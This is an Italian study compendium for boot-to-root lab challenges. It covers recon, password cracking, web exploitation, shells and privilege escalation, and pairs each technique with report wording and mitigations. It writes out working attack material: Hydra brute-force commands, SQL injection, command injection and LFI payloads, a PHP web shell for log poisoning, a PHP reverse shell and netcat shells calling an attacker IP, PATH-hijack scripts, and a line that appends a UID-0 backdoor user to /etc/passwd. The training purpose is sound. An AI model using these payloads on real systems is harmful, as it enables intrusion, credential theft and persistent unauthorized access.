# Compendio pratico boot-to-root per esercitazioni

## 0. Logica generale del percorso boot-to-root

In una challenge boot-to-root il percorso tipico è:

1. **Recon / Enumeration esterna**
    
    - Capire quali host, domini, porte e servizi sono esposti.
        
    - Obiettivo: trovare una superficie d’attacco iniziale.
        
2. **Enumeration web / service enumeration**
    
    - Analizzare servizi web, virtual host, directory nascoste, login, file interessanti.
        
    - Obiettivo: trovare una vulnerabilità applicativa o credenziali.
        
3. **Exploitation iniziale**
    
    - Sfruttare una vulnerabilità per ottenere accesso iniziale.
        
    - Esempi: SQL injection, command injection, file inclusion, upload bypass, credenziali trovate.
        
4. **Accesso alla macchina**
    
    - Ottenere una shell o accedere con SSH.
        
    - Obiettivo: diventare utente locale sul sistema.
        
5. **Privilege escalation enumeration**
    
    - Raccogliere informazioni interne: utente, gruppi, kernel, sudo, SUID, cron, capabilities, file sensibili.
        
6. **Finding attack vectors**
    
    - Interpretare le informazioni raccolte e individuare vulnerabilità concrete.
        
    - Esempi: SUID abusabile, cronjob scrivibile, path hijacking, password reuse, chiavi SSH, sudo misconfigurato.
        
7. **Exploit them**
    
    - Sfruttare il vettore trovato per diventare un utente più privilegiato o root.
        
8. **Report**
    
    - Per ogni vulnerabilità: descrivere contesto, impatto, prova, sfruttamento e mitigazione.
        

---

# 1. Wordlist, password cracking e brute force

## Obiettivo

Creare o usare liste di password/username per:

- cracking offline di hash;
    
- brute force online su servizi;
    
- generazione di credenziali candidate basate sul target.
    

## Vulnerabilità / concetti collegati

- Password deboli
    
- Password reuse
    
- Hash cracking offline
    
- Brute force online
    
- Dictionary attack
    
- Custom wordlist attack
    
- Archive password cracking
    
- Login form brute force
    

## Wordlist utili

```bash
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## Creazione wordlist

### Crunch

```bash
crunch 7 10 AB
```

Serve a generare combinazioni di lunghezza da 7 a 10 usando i caratteri indicati.

Nel report puoi scrivere:

> È stata generata una wordlist custom per testare password con pattern prevedibile. Questa tecnica rientra nei dictionary/bruteforce attack.

### CeWL

```bash
cewl https://www.target.xyz -w targetWL.txt
```

Opzioni utili:

```bash
-d 1
-m 5
```

Significato:

- `-w`: file di output;
    
- `-d`: profondità di crawling;
    
- `-m`: lunghezza minima delle parole.
    

Nel report:

> È stata creata una wordlist target-specific tramite parole estratte dal sito. Questo aumenta l’efficacia dell’attacco perché sfrutta termini legati al contesto della vittima.

### Username-Anarchy

```bash
username-anarchy -i names.txt > usernames.txt
```

Serve a generare username partendo da nomi e cognomi.

Vulnerabilità collegata:

- naming convention prevedibile;
    
- username enumeration;
    
- brute force su login.
    

---

# 2. Identificazione e cracking di hash

## Obiettivo

Quando trovi un hash, devi:

1. capire che tipo di hash è;
    
2. scegliere il formato corretto;
    
3. provarlo con John o Hashcat.
    

## Hashid

```bash
hashid hashcode
hashid -j <file_hash>
```

`hashid -j` prova a suggerire anche il formato per John.

Nota utile:

> Un hash Windows scritto tutto in maiuscolo può essere un indizio verso NTLM.

## Prefissi comuni in `/etc/shadow`

```text
$1$  -> MD5
$2a$ -> Blowfish
$2y$ -> Blowfish
$5$  -> SHA-256
$6$  -> SHA-512
$y$  -> yescrypt
```

## John the Ripper

### Cracking con formato specifico

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
```

### Single crack

```bash
john --single hashList
```

Vulnerabilità / concetto:

- password derivate da username;
    
- utenti che scelgono password prevedibili.
    

### Wordlist con regole

```bash
john --wordlist=/path/to/wordlist --rules=Myrule <hashes_file>
```

### Generare una nuova wordlist con regole

```bash
john --wordlist=/path/to/wordlist --rules=Myrule --stdout > nuova_wordlist.txt
```

### Limitare lunghezza

```bash
john --min-length=3 --max-length=5 --wordlist=wordlist.txt hash.txt
```

### Mostrare password già crackate

```bash
john --show --format=raw-md4 hash
```

Nel report:

> L’hash è stato attaccato offline con John the Ripper. Il cracking offline è possibile quando l’attaccante ottiene il digest della password e può provare candidati localmente senza interagire con il servizio target.

---

# 3. Cracking di file compressi

## Obiettivo

Estrarre l’hash da un archivio protetto e crackarlo offline.

## ZIP

```bash
zip2john secret_corporate.zip > secret_corporate.zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt secret_corporate.zip.hash
```

## 7z

```bash
7z2john backup.7z > zipHash
john --wordlist=/usr/share/wordlists/rockyou.txt zipHash
```

## Estrazione con password

```bash
7z x backup.7z -p{PASSWORD}
```

Vulnerabilità collegata:

- archivio protetto da password debole;
    
- segreti conservati in file compressi;
    
- credential disclosure.
    

Nel report:

> È stato individuato un archivio protetto da password. L’hash dell’archivio è stato estratto e sottoposto a cracking offline. La password debole ha permesso di accedere al contenuto dell’archivio.

---

# 4. Unshadow Linux

## Obiettivo

Combinare `/etc/passwd` e `/etc/shadow` per crackare password Linux.

```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

Con file reali:

```bash
unshadow /etc/passwd /etc/shadow > hashesFile
```

Vulnerabilità collegata:

- lettura non autorizzata di `/etc/shadow`;
    
- backup leggibili;
    
- permessi errati su file sensibili.
    

Nel report:

> La possibilità di leggere `/etc/shadow` rappresenta una grave esposizione di credenziali. Combinando `/etc/passwd` e `/etc/shadow` è stato possibile preparare gli hash per il cracking offline.

---

# 5. Hydra e attacchi online

## Obiettivo

Provare combinazioni username/password direttamente contro un servizio.

## Servizi classici

```bash
hydra -L userlist.txt -P passwordfile.txt 192.168.20.10 pop3
```

```bash
hydra -t 4 -l EdoMan000 -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```

Opzioni:

- `-l`: username singolo;
    
- `-L`: lista username;
    
- `-p`: password singola;
    
- `-P`: lista password;
    
- `-t`: numero thread;
    
- `-vV`: verbose.
    

## Login HTTP POST form

```bash
hydra -L users.txt -P E05_passwords.list vdsi.mrt.red -s 5000 http-post-form "/login:user=^USER^&pass=^PASS^:F=Login Failed" -V -c 1
```

Significato:

- `^USER^`: placeholder username;
    
- `^PASS^`: placeholder password;
    
- `F=Login Failed`: stringa che indica login fallito;
    
- `-s`: porta;
    
- `-c 1`: una connessione alla volta.
    

## HTTP GET protetto

```bash
hydra -L users.txt -P E05_passwords.list vdsi.mrt.red -s 5000 http-get /loginpage -V -c 1
```

## HTTP GET form

```bash
hydra -L users.txt -P E05_passwords.list vdsi.mrt.red -s 5000 http-get-form "/login?user=^USER^&pass=^PASS^:F=Login Failed" -V -c 1
```

Vulnerabilità collegate:

- password debole;
    
- assenza di rate limiting;
    
- assenza di lockout;
    
- messaggi di errore distinguibili;
    
- brute force online.
    

Nel report:

> Il servizio di autenticazione non implementava sufficienti protezioni contro tentativi ripetuti. È stato quindi possibile effettuare un brute force online con Hydra, usando una lista di utenti e password candidate.

---

# 6. Network enumeration

## Obiettivo

Individuare DNS, sottodomini, porte aperte, servizi e versioni.

## DNS TXT record

```bash
dig @192.168.14.98 vdsilab.local txt
```

Uso:

- cercare note;
    
- token;
    
- flag;
    
- informazioni inserite nei record TXT.
    

Vulnerabilità / rischio:

- information disclosure tramite DNS TXT.
    

## Zone transfer DNS

```bash
dig @192.168.14.16 vdsi-corp.xyz -p 58053 axfr
```

```bash
dig @192.168.14.95 vdsisecurity.lab axfr
```

Vulnerabilità:

- DNS zone transfer abilitato verso host non autorizzati.
    

Nel report:

> Il server DNS permetteva una richiesta AXFR non autorizzata. Questo ha consentito di ottenere una copia della zona DNS e scoprire host e sottodomini interni.

## DNS enum / forward lookup brute force

```bash
dnsenum vdsisecurity.lab --dnsserver 192.168.14.95 -f subdomains-top1million-5000.txt
```

Vulnerabilità / concetto:

- subdomain enumeration;
    
- discovery di host nascosti;
    
- esposizione eccessiva della superficie d’attacco.
    

## Nmap scan base

```bash
nmap -sC -sV -sS 192.168.14.117
```

Significato:

- `-sS`: SYN scan;
    
- `-sV`: service/version detection;
    
- `-sC`: script default.
    

Vulnerabilità trovabili:

- servizi esposti;
    
- versioni vulnerabili;
    
- configurazioni deboli;
    
- banner informativi.
    

Nel report:

> È stata eseguita una scansione TCP SYN per identificare porte aperte e servizi esposti. La rilevazione di versione ha permesso di valutare possibili vulnerabilità note.

## Scansione porte specifiche/range

```bash
nmap -p 62260-65535 192.168.14.97
```

Uso:

- trovare servizi su porte non standard;
    
- evitare di limitarsi alle top ports.
    

## Skip host discovery

```bash
nmap -P0 <ip>
```

Uso:

- utile se il target blocca ping/ICMP;
    
- forza Nmap a scansionare anche se l’host non risponde al ping.
    

Vulnerabilità / concetto:

- firewall evasion base;
    
- host attivo ma non pingabile.
    

## Banner grabbing / servizio custom

```bash
nc 192.168.14.115 9007
```

Uso:

- connettersi manualmente;
    
- leggere banner;
    
- interagire con servizi testuali;
    
- capire protocollo o logica della challenge.
    

Nel report:

> Tramite connessione manuale al servizio è stato possibile leggere il banner e comprendere il comportamento applicativo.

## Metodo HTTP TRACE

```bash
curl -v -X TRACE http://192.168.14.99:8080
```

Vulnerabilità collegata:

- metodo HTTP TRACE abilitato;
    
- possibile misconfigurazione;
    
- in alcuni scenari può contribuire a Cross-Site Tracing.
    

Nel report:

> Il server accettava il metodo HTTP TRACE. Anche se non sempre sfruttabile direttamente, questa configurazione rappresenta una superficie aggiuntiva e dovrebbe essere disabilitata se non necessaria.

---

# 7. Virtual host e Host header

## Obiettivo

Scoprire applicazioni web nascoste sullo stesso IP.

## Curl con Host header

```bash
curl -H "Host: sup3r.s3cr3t-b4ck3nd.vdsizone.transfer" http://192.168.14.96
```

Vulnerabilità / concetto:

- virtual host discovery;
    
- applicazioni nascoste dietro stesso IP;
    
- routing applicativo basato su `Host`.
    

Nel report:

> Lo stesso indirizzo IP ospitava più virtual host. Modificando l’header HTTP `Host` è stato possibile raggiungere un’applicazione non visibile accedendo direttamente all’IP.

## Wfuzz vhost

```bash
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://192.168.14.27 -H "HOST: FUZZ.muntrea-energy.vdsi" --hh 1950
```

`--hh` serve a nascondere risposte con una certa lunghezza, utile per eliminare falsi positivi.

## Gobuster vhost

```bash
gobuster vhost -u http://vdsi-services.xyz/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

```bash
gobuster vhost --ad -u http://orbetellobiblio.vdsi -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

`--ad` append domain: prova automaticamente `parola.dominio`.

---

# 8. Web content discovery

## Obiettivo

Scoprire directory, file nascosti, backup, pannelli admin, `.git`, file PHP.

## File manuali da controllare

```text
/robots.txt
/sitemap.xml
```

Vulnerabilità / concetto:

- information disclosure;
    
- directory nascoste indicate involontariamente;
    
- file utili alla fase di enumeration.
    

## Gobuster dir

```bash
gobuster dir -u http://cloud.vdsi --proxy http://127.0.0.1:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 4829
```

Uso:

- content discovery;
    
- proxy verso Burp;
    
- filtro falsi positivi con `--exclude-length`.
    

## Gobuster con estensione PHP

```bash
gobuster dir -u http://admin.cloud.vdsi -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 0 -x php
```

`-x php` prova anche file con estensione `.php`.

## Feroxbuster

```bash
feroxbuster -u http://vdsi-services.xyz/d3v-VDS1 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

## Git dumping

```bash
git_dumper.py http://vdsi-services.xyz/d3v-VDS1/.git/ ./sberg2
```

Vulnerabilità:

- directory `.git` esposta;
    
- source code disclosure;
    
- segreti nel repository;
    
- credenziali hardcoded;
    
- endpoint nascosti nel codice.
    

Nel report:

> La directory `.git` era pubblicamente accessibile. Questo ha permesso di scaricare il repository e analizzare il codice sorgente, con possibile esposizione di credenziali, endpoint interni o logica applicativa sensibile.

---

# 9. Web exploitation: SQL injection

## Obiettivo

Verificare se input utente finisce dentro una query SQL senza sanitizzazione.

## Payload base

```sql
' OR '1'='1
```

Vulnerabilità:

- SQL injection;
    
- authentication bypass;
    
- data exfiltration;
    
- query manipulation.
    

Nel report:

> Il form di login era vulnerabile a SQL injection perché l’input utente veniva concatenato direttamente nella query SQL. Inserendo una condizione sempre vera è stato possibile alterare la logica di autenticazione.

## Come descriverla

Schema report:

```text
Vulnerabilità: SQL Injection
Punto vulnerabile: parametro username/password/id
Causa: input utente inserito direttamente nella query
Impatto: bypass login / lettura dati / estrazione credenziali
Prova: payload usato e risposta ottenuta
Mitigazione: prepared statements, query parametrizzate, validazione input
```

---

# 10. Web exploitation: OS command injection

## Obiettivo

Capire se un input web viene inserito in un comando di sistema.

## Payload esempio

```bash
";"id"
```

Oppure concettualmente:

```bash
8.8.8.8; id
```

Vulnerabilità:

- OS command injection;
    
- Remote Code Execution;
    
- information disclosure;
    
- accesso iniziale tramite reverse shell.
    

Nel report:

> L’applicazione eseguiva un comando di sistema usando input controllabile dall’utente. Inserendo un separatore di comandi è stato possibile eseguire un comando arbitrario sul server.

Mitigazioni:

- evitare shell command quando possibile;
    
- validazione whitelist;
    
- escaping corretto;
    
- esecuzione con utente poco privilegiato;
    
- least privilege.
    

---

# 11. Web exploitation: LFI, path traversal e wrapper PHP

## Obiettivo

Sfruttare parametri che includono o leggono file dal filesystem.

## Payload LFI/path traversal

```text
?page=file:///etc/passwd
```

```text
../../../../etc/passwd
```

```text
..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

Vulnerabilità:

- Local File Inclusion;
    
- Path Traversal;
    
- lettura file sensibili;
    
- information disclosure.
    

Nel report:

> Il parametro `page` permetteva di controllare il percorso del file incluso. Usando sequenze di path traversal è stato possibile accedere a file locali del server.

## PHP filter wrapper

```text
php://filter/read=convert.base64-encode/resource=config
```

Uso:

- leggere sorgente PHP senza farlo eseguire;
    
- ottenere codice in Base64;
    
- cercare credenziali hardcoded.
    

Vulnerabilità:

- LFI con source code disclosure;
    
- PHP wrapper abuse.
    

Nel report:

> Tramite il wrapper `php://filter` è stato possibile leggere il sorgente di un file PHP codificato in Base64, evitando che venisse interpretato dal motore PHP.

## Data wrapper

```text
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

Uso:

- iniettare contenuto direttamente;
    
- utile solo se la configurazione PHP lo permette.
    

---

# 12. LFI to RCE: log poisoning

## Obiettivo

Trasformare una LFI in esecuzione di codice.

## Idea

Se non posso caricare un file, posso provare a scrivere codice PHP dentro un file di log e poi includerlo tramite LFI.

Log interessanti:

```text
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/<nome_server>/access.log
```

Payload concettuale nello User-Agent:

```php
<?php system($_GET['cmd']); ?>
```

Poi includo il log:

```text
?page=/var/log/apache2/access.log&cmd=id
```

Vulnerabilità:

- LFI;
    
- log poisoning;
    
- LFI to RCE.
    

Nel report:

> La LFI consentiva di includere file di log del web server. Inserendo codice PHP in un header HTTP salvato nei log e includendo successivamente il file, è stato possibile ottenere esecuzione di comandi.

Mitigazioni:

- non includere percorsi controllabili dall’utente;
    
- whitelist dei file includibili;
    
- disabilitare esecuzione PHP in directory non necessarie;
    
- proteggere i log;
    
- corretta separazione tra dati e codice.
    

---

# 13. File upload bypass e MIME type

## Obiettivo

Capire se il server controlla male i file caricati.

## Concetto MIME

Esempi:

```text
image/png
image/jpeg
text/plain
application/x-php
```

Bypass debole:

```text
Content-Type: image/png
```

anche se il file è PHP.

Vulnerabilità:

- unrestricted file upload;
    
- MIME validation bypass;
    
- web shell upload;
    
- remote code execution.
    

Nel report:

> Il controllo sull’upload verificava solo il Content-Type dichiarato dal client. Modificando l’header MIME è stato possibile caricare un file non previsto. Un controllo robusto dovrebbe verificare estensione, contenuto reale, magic bytes e configurazione del server.

## Reverse shell PHP

```php
<?php
$s=fsockopen("10.8.0.7",9999);
proc_open("/bin/bash",[$s,$s,$s],$p);
?>
```

Listener:

```bash
nc 9999 -lvnp
```

Nota:

- il web server spesso gira come `www-data`;
    
- ottenere shell web non significa essere root;
    
- dopo serve privilege escalation.
    

---

# 14. Shell, reverse shell, bind shell

## Obiettivo

Ottenere una shell interattiva dopo una RCE.

## Reverse shell

Attaccante:

```bash
nc -lvp 4444
```

Target:

```bash
nc <IP_attaccante> 4444 -e /bin/bash
```

Vulnerabilità collegate:

- RCE;
    
- command injection;
    
- upload di web shell;
    
- LFI to RCE.
    

Nel report:

> Dopo aver ottenuto esecuzione di comandi, è stata avviata una reverse shell. Il target ha instaurato una connessione in uscita verso la macchina dell’attaccante, permettendo l’esecuzione interattiva di comandi.

## Bind shell

Target:

```bash
nc -lvp 4444 -e /bin/bash
```

Attaccante:

```bash
nc <IP_target> 4444
```

Nota:

- spesso bloccata da firewall;
    
- richiede porta aperta sul target.
    

## Stabilizzare shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Obiettivo:

- ottenere shell più interattiva;
    
- migliorare gestione input/output.
    

---

# 15. Pivoting e port forwarding

## Obiettivo

Usare una macchina compromessa come ponte verso servizi interni.

## Local port forwarding

```bash
ssh user@192.168.0.45 -L 8080:192.168.0.35:80
```

Significato:

- apro `localhost:8080` sul mio PC;
    
- il traffico passa nella macchina compromessa;
    
- raggiungo `192.168.0.35:80`.
    

Vulnerabilità / scenario:

- servizio interno non esposto pubblicamente;
    
- lateral movement;
    
- rete segmentata ma accessibile dal pivot.
    

Nel report:

> La macchina compromessa aveva accesso a un servizio interno non raggiungibile direttamente. È stato configurato un local port forwarding per accedere al servizio attraverso il pivot.

## Remote port forwarding

```bash
ssh user@192.168.0.45 -R 8080:localhost:4444
```

Significato:

- apro una porta sulla macchina remota;
    
- il traffico ricevuto lì viene inoltrato verso la mia macchina.
    

---

# 16. Privilege escalation: enumeration

## Obiettivo

Capire chi sono, cosa posso fare e quali misconfigurazioni esistono.

## Identità utente

```bash
whoami
id
groups
```

Cerca:

- UID/GID;
    
- gruppi interessanti;
    
- privilegi inattesi.
    

Nel report:

> L’utente compromesso apparteneva al gruppo X, che permetteva accesso a risorse non previste.

## Sistema operativo e kernel

```bash
uname -a
```

Cerca:

- versione kernel;
    
- possibile kernel exploit;
    
- architettura.
    

Nel report:

> È stata raccolta la versione del kernel per valutare eventuali exploit locali compatibili.

## History e ambiente

```bash
history
printenv
```

Cerca:

- password nei comandi;
    
- token;
    
- variabili sensibili;
    
- PATH modificabile.
    

Vulnerabilità:

- credential leakage;
    
- secret exposure;
    
- PATH hijacking.
    

## File e utenti

```bash
cat /etc/passwd
cat /etc/hosts
```

Cerca:

- utenti con shell;
    
- host interni;
    
- nomi utili;
    
- possibili password reuse.
    

## Log

```bash
cat /var/log/auth.log
```

Cerca:

- login;
    
- utenti;
    
- comandi;
    
- tentativi falliti;
    
- informazioni operative.
    

## Cron

```bash
ls -la /var/spool/cron/crontabs
ls -la /etc/cron.*
crontab -l
```

Cerca:

- script eseguiti periodicamente;
    
- script scrivibili;
    
- task eseguiti come root.
    

Vulnerabilità:

- writable cron script;
    
- cron PATH hijacking;
    
- privilege escalation via scheduled task.
    

## SUID / SGID

```bash
find / -perm -u=s -type f 2>/dev/null
```

```bash
find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

Cerca:

- binari eseguiti con privilegi del proprietario;
    
- binari custom;
    
- binari presenti su GTFOBins.
    

Vulnerabilità:

- SUID privilege escalation;
    
- insecure binary permissions;
    
- shell escape;
    
- file read/write abuse.
    

## File per utente o gruppo

```bash
find / -user nomeutente 2>/dev/null
find / -group nomegruppo 2>/dev/null
```

Cerca:

- file posseduti da utenti privilegiati;
    
- file modificabili;
    
- script sensibili.
    

## Capabilities

```bash
getcap -r / 2>/dev/null
```

Vulnerabilità:

- Linux capabilities abuse;
    
- `cap_setuid`;
    
- `cap_dac_read_search`;
    
- `cap_dac_override`.
    

## Sudo

```bash
sudo -l
```

Cerca:

- comandi eseguibili come root;
    
- NOPASSWD;
    
- binari abusabili tramite GTFOBins.
    

Vulnerabilità:

- sudo misconfiguration;
    
- privilege escalation via allowed command;
    
- shell escape;
    
- arbitrary file read/write.
    

## Processi

```bash
top
ps aux
ps aux | grep nome
```

Cerca:

- servizi interni;
    
- processi root;
    
- script periodici;
    
- credenziali in command line.
    

## File inspection

```bash
file <file_name>
strings nomefile
```

Uso:

- capire tipo file;
    
- leggere stringhe da binari;
    
- trovare path, password, comandi interni.
    

---

# 17. Privilege escalation: finding attack vectors

## 17.1 Sudo misconfiguration

Comando di partenza:

```bash
sudo -l
```

Poi:

- cercare il binario su GTFOBins;
    
- verificare se permette shell escape;
    
- verificare file read/write.
    

Nel report:

> L’utente poteva eseguire un binario come root tramite sudo. Il binario consentiva una shell escape, permettendo escalation a root.

## 17.2 SUID abuse

Comandi di ricerca:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Poi:

- identificare binario anomalo;
    
- usare `strings`;
    
- cercare su GTFOBins;
    
- verificare se richiama comandi senza path assoluto.
    

Nel report:

> È stato trovato un binario SUID eseguibile dall’utente. Poiché il binario veniva eseguito con i privilegi del proprietario, è stato possibile abusarne per ottenere privilegi elevati.

## 17.3 Path hijacking

Condizioni:

- binario privilegiato;
    
- comando chiamato senza path assoluto;
    
- PATH controllabile.
    

Idea:

```bash
export PATH=/tmp:$PATH
```

Creare falso comando:

```bash
echo '#!/bin/bash' > /tmp/cat
echo '/bin/bash -p' >> /tmp/cat
chmod +x /tmp/cat
```

Poi eseguire il binario vulnerabile.

Vulnerabilità:

- SUID Path Hijacking;
    
- insecure use of relative command path.
    

Nel report:

> Il binario privilegiato invocava un comando senza usare il percorso assoluto. Modificando la variabile PATH è stato possibile far eseguire un binario controllato dall’attaccante con privilegi elevati.

## 17.4 Cronjob writable

Strumenti:

```bash
crontab -l
ls -la /etc/cron.*
ls -la /var/spool/cron/crontabs
```

Monitoraggio con pspy:

```bash
./pspy64
```

Trasferimento:

```bash
scp ./pspy user@IP:/tmp/
```

oppure:

```bash
python3 -m http.server 8000
curl http://TUO_IP:8000/pspy64
```

Vulnerabilità:

- cronjob eseguito come root;
    
- script scrivibile;
    
- PATH debole nei cron;
    
- scheduled task abuse.
    

Nel report:

> È stato individuato uno script eseguito periodicamente da cron con privilegi elevati. Poiché lo script era modificabile dall’utente compromesso, è stato possibile inserire un comando arbitrario eseguito come root.

## 17.5 Capabilities abuse

Comando:

```bash
getcap -r / 2>/dev/null
```

Cerca:

- `cap_setuid`;
    
- `cap_dac_read_search`;
    
- `cap_dac_override`.
    

Nel report:

> Alcuni binari avevano capabilities Linux assegnate. Poiché certe capabilities permettono azioni normalmente riservate a root, è stato possibile abusarne per leggere file protetti o ottenere privilegi elevati.

## 17.6 Password reuse / switch user

```bash
su nomeutente
su - nomeutente
```

Vulnerabilità:

- password reuse;
    
- credenziali trovate in file/config;
    
- credenziali crackate.
    

Nel report:

> Una password recuperata durante l’enumeration era riutilizzata da un utente locale. Questo ha permesso di cambiare utente e proseguire l’escalation.

## 17.7 SSH key disclosure

Cerca chiavi private:

```bash
cat /home/utente/.ssh/id_rsa
```

Uso:

```bash
chmod 600 chiave_ssh
ssh -i <chiave_ssh> user@<ip>
```

Vulnerabilità:

- private key disclosure;
    
- permessi errati su `.ssh`;
    
- accesso SSH non protetto.
    

Nel report:

> È stata trovata una chiave privata SSH leggibile dall’utente compromesso. La chiave ha permesso l’accesso come altro utente senza conoscere la password.

## 17.8 Authorized keys persistence

Aggiunta chiave pubblica:

```bash
cat /home/kali/.ssh/id_ed25519.pub
```

Inserimento in:

```bash
/home/casdoor/.ssh/authorized_keys
```

Connessione:

```bash
ssh -i /home/kali/.ssh/id_ed25519 casdoor@192.168.14.16
```

Nota report:

- utile in laboratorio;
    
- in un report va descritto come tecnica di accesso/persistenza;
    
- non confonderlo con vulnerabilità primaria: la vulnerabilità è avere permesso di scrittura su `authorized_keys`.
    

---

# 18. Privilege escalation: exploit them

## 18.1 Sudo to root

```bash
sudo comando
sudo -u utente comando
```

Usa se:

- `sudo -l` mostra comandi permessi;
    
- il comando è abusabile;
    
- esiste tecnica GTFOBins.
    

## 18.2 Modifica permessi

```bash
chmod +x file.txt
chmod +w file.txt
chmod +r file.txt
chmod 777 file.txt
```

Uso:

- rendere eseguibile script;
    
- modificare file se hai privilegi;
    
- preparare exploit locale.
    

Attenzione:

- non è una vulnerabilità da sola;
    
- serve se hai già permessi sufficienti.
    

## 18.3 Aggiungere utente root in `/etc/passwd`

Creare hash:

```bash
openssl passwd -6 password123
```

Aggiungere utente:

```bash
echo 'backdoor:$6$salt$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Vulnerabilità:

- `/etc/passwd` scrivibile;
    
- arbitrary file write as root;
    
- misconfigurazione gravissima.
    

Nel report:

> La possibilità di scrivere in `/etc/passwd` ha permesso di aggiungere un utente con UID 0. Questo equivale a ottenere privilegi root.

---

# 19. Come trasformare tutto in report

## Struttura consigliata per ogni vulnerabilità

```text
Titolo vulnerabilità:
Esempio: SQL Injection nel form di login

Contesto:
Dove è stata trovata? Endpoint, servizio, porta, file, parametro.

Evidenza:
Quale comando/payload l’ha dimostrata?

Impatto:
Cosa permette di fare? Leggere dati, bypassare login, ottenere shell, diventare root.

Sfruttamento:
Passaggi essenziali, senza confondere enumeration e exploit.

Mitigazione:
Come si corregge?
```

## Esempio: DNS Zone Transfer

```text
Vulnerabilità: DNS Zone Transfer non autorizzato

Contesto:
Durante l’enumeration DNS è stato interrogato il server autoritativo del dominio.

Evidenza:
La richiesta AXFR ha restituito record della zona DNS.

Impatto:
Un attaccante può ottenere host, sottodomini e struttura interna della rete.

Sfruttamento:
Le informazioni ottenute sono state usate per individuare nuovi target web.

Mitigazione:
Limitare AXFR solo a DNS secondari autorizzati.
```

## Esempio: Virtual Host Discovery

```text
Vulnerabilità / Misconfigurazione: virtual host non documentato esposto

Contesto:
Lo stesso IP esponeva più applicazioni web sulla stessa porta.

Evidenza:
Modificando l’header Host è stata servita un’applicazione diversa.

Impatto:
Applicazioni interne o non linkate possono essere raggiunte se si conosce l’host corretto.

Mitigazione:
Limitare l’esposizione dei virtual host, configurare correttamente DNS e access control.
```

## Esempio: LFI

```text
Vulnerabilità: Local File Inclusion

Contesto:
Il parametro page controllava il file incluso dal server.

Evidenza:
Usando path traversal è stato possibile leggere /etc/passwd.

Impatto:
L’attaccante può leggere file locali e, in alcuni casi, arrivare a RCE tramite log poisoning o wrapper PHP.

Mitigazione:
Usare whitelist di file includibili, normalizzare i path e non passare input utente direttamente a include/require.
```

## Esempio: Privilege Escalation via SUID Path Hijacking

```text
Vulnerabilità: SUID Path Hijacking

Contesto:
È stato trovato un binario SUID che eseguiva un comando senza path assoluto.

Evidenza:
Modificando PATH, il binario ha eseguito un comando controllato dall’attaccante.

Impatto:
Esecuzione di codice con i privilegi del proprietario del binario, fino a root.

Mitigazione:
Usare path assoluti nei binari privilegiati, sanitizzare l’ambiente e rimuovere SUID non necessari.
```

---

# 20. Checklist rapida da usare in challenge

## Esterno

```text
1. DNS: dig, dnsenum, AXFR
2. Host/port scan: nmap
3. Versioni: nmap -sV, banner grabbing
4. Web: robots.txt, sitemap.xml
5. Vhost: Host header, gobuster vhost, wfuzz
6. Directory: gobuster dir, feroxbuster
7. Codice esposto: .git dump
```

## Web exploit

```text
1. Login -> SQL injection / brute force
2. Parametri tipo page/file -> LFI / path traversal / wrapper
3. Parametri tipo ping/host/ip -> command injection
4. Upload -> MIME bypass / web shell
5. LFI + log -> log poisoning
6. RCE -> reverse shell
```

## Dopo shell

```text
1. Stabilizza shell
2. whoami, id, groups
3. uname -a
4. sudo -l
5. SUID/SGID
6. capabilities
7. cronjob
8. processi
9. history/env
10. file sensibili e SSH keys
```

## Privilege escalation

```text
1. sudo abuse -> GTFOBins
2. SUID abuse -> GTFOBins / path hijacking
3. cron writable -> comando eseguito come root
4. capabilities -> abuso privilegi parziali
5. password reuse -> su/ssh
6. writable /etc/passwd -> UID 0
7. SSH key disclosure -> accesso come altro utente
```